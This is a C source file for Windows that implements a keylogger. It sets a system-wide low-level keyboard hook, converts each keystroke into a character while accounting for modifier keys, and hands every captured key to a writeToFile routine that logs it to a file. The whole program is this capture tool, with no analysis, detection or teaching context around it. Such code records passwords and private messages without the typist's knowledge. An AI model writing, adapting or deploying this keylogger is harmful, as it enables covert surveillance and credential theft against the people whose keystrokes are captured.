#include <stdio.h>
#include <windows.h>
#include "hFile.h"

HHOOK h_hook = NULL;

LRESULT CALLBACK hook_proc(int code, WPARAM w_param, LPARAM l_param){
    if (code == HC_ACTION){
        KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)l_param;

        // check if the key is pressed
        if (w_param == WM_KEYDOWN || w_param == WM_SYSKEYDOWN){
            BYTE key_state[256];
            GetKeyboardState(key_state);

            if (GetAsyncKeyState(VK_SHIFT) & 0x8000){
                key_state[VK_SHIFT] |= 0x80;
            }
            if (GetAsyncKeyState(VK_CAPITAL) & 0x0001){
                key_state[VK_CAPITAL] |= 0x01;
            }
            if (GetAsyncKeyState(VK_MENU) & 0x8000){
                key_state[VK_MENU] |= 0x80;
            }
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000){
                key_state[VK_CONTROL] |= 0x80;
            }

            WCHAR key_name[8];
            UINT scan_code = keyboard->scanCode;

            int res = ToUnicode(
                keyboard->vkCode,
                scan_code,
                key_state,
                key_name,
                sizeof(key_name) / sizeof(WCHAR),
                0);
            if (res > 0){
                key_name[res] = L'\0';
                // wprintf(L"Key Pressed: %ls\n", key_name);
                writeToFile(key_name[0]);
            }else{
                WCHAR name[256];
                LONG lParam = (keyboard->scanCode << 16);

                if (keyboard->flags & LLKHF_EXTENDED){
                    lParam |= (1 << 24);
                }
                if (GetKeyNameTextW(lParam, name, sizeof(name) / sizeof(WCHAR)) > 0){
                    // wprintf(L"Key Pressed: %ls\n", name);
                    writeToFile(name[0]);
                }else{
                    // wprintf(L"Key Pressed: VK Code %d\n", keyboard->vkCode);
                    writeToFile((char)keyboard->vkCode);
                }
            }
        }
    }

    return CallNextHookEx(h_hook, code, w_param, l_param);
}

int main(){
    // set the hook
    h_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (h_hook == NULL){
        printf("Failed to set hook\n");
        return 1;
    }

    printf("Listening for the key inputs");

    // msg loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(h_hook);
    return 0;
}